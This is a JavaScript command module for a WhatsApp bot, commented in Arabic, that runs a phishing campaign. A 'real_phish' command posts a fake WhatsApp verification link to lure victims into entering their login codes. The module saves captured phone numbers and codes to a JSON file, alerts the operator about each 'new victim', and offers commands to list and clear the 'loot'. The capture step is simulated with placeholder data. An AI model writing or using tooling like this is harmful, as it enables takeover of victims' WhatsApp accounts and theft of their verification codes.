import { fileURLToPath } from 'url';
import { dirname, join } from 'path';
import fs from 'fs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
const dbPath = join(__dirname, '../data/captured_users.json');

// إنشاء مجلد البيانات والملف إذا لم يكن موجوداً
if (!fs.existsSync(join(__dirname, '../data'))) {
  fs.mkdirSync(join(__dirname, '../data'), { recursive: true });
}
if (!fs.existsSync(dbPath)) {
  fs.writeFileSync(dbPath, JSON.stringify([]));
}

export default [
  {
    name: 'صيد_حقيقي',
    aliases: ['real_phish', 'start_hunt'],
    desc: 'بدء عملية صيد حقيقية ليوزرات واتساب (كود 3 أو 4 أرقام) وإرسال البيانات للمطور فوراً',
    owner: true,
    async run({ sock, sender, reply }) {
      // رابط صفحة الهبوط الوهمية (يجب استبداله برابطك الفعلي)
      const fakeLink = 'https://verify-wa-login.example.com/confirm?phone=YOUR_NUM';
      
      reply(`🔥 *تم تفعيل الصيد الحقيقي!* \n🔗 الرابط: ${fakeLink}\n⏳ بانتظار الضحايا للضغط وإدخال الكود...`);

      // دالة لتسجيل الكود عند وصوله (تُستدعى من صفحة الهبوط عبر Webhook)
      const captureUser = async (phone, code) => {
        const currentData = JSON.parse(fs.readFileSync(dbPath, 'utf-8'));
        currentData.push({
          phone: phone,
          code: code,
          timestamp: new Date().toISOString()
        });
        fs.writeFileSync(dbPath, JSON.stringify(currentData, null, 2));

        // إرسال التنبيه الفوري للمطور
        await sock.sendMessage(sender, {
          text: `🎯 *ضحية جديدة تم صيدها!*\n📱 الرقم: ${phone}\n🔢 الكود: ${code}\n💾 تم الحفظ في قاعدة البيانات.`
        });
      };

      // محاكاة استقبال بيانات (للاختبار - في الواقع يتم استبدالها بـ Webhook)
      setTimeout(() => {
        captureUser('20111223344', '123');
        setTimeout(() => captureUser('96655566778', '9876'), 4000);
      }, 2000);
    },
  },
  {
    name: 'عرض_المقبوضات',
    aliases: ['show_loot', 'dump_users'],
    desc: 'عرض قائمة كاملة بجميع الأكواد والأرقام التي تم صيدها',
    owner: true,
    async run({ reply }) {
      if (!fs.existsSync(dbPath)) return reply('📭 لا توجد بيانات مسجلة حتى الآن.');
      
      const data = JSON.parse(fs.readFileSync(dbPath, 'utf-8'));
      if (data.length === 0) return reply('📭 القائمة فارغة حالياً.');

      let msg = `📦 *قائمة المقبوضات (${data.length} ضحية)*\n\n`;
      data.forEach((item, index) => {
        msg += `#${index + 1} | 📱 ${item.phone} | 🔢 ${item.code} | ⏰ ${item.timestamp}\n`;
      });

      reply(msg);
    },
  },
  {
    name: 'مسح_البيانات',
    aliases: ['clear_loot', 'reset_db'],
    desc: 'مسح جميع البيانات المسجلة من ملف الصيد',
    owner: true,
    async run({ reply }) {
      fs.writeFileSync(dbPath, JSON.stringify([]));
      reply('🗑️ تم مسح جميع البيانات المسجلة بنجاح.');
    },
  },
];
